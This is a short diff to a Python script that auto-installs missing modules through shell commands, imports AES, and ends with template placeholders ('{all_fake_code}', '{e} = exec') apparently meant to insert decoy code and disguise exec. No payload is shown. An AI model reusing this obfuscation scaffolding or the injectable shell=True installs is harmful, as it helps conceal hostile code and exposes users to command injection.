@@ -135,7 +135,7 @@ for modl in requirements:
     try:
         import_module(module[0])
     except:
-        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
+        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
         time.sleep(3)
         
 import requests
@@ -178,7 +178,7 @@ for modl in requirements:
     try:
         import_module(module[0])
     except:
-        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
+        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
         time.sleep(3)
         
 
@@ -199,8 +199,7 @@ try:
 except:
     subprocess.run("python -m pip install requests", shell=True)
 
-import Cryptodome
-from Cryptodome import Cipher
+from Cryptodome.Cipher import AES
 import requests
 {all_fake_code}
 {e} = exec
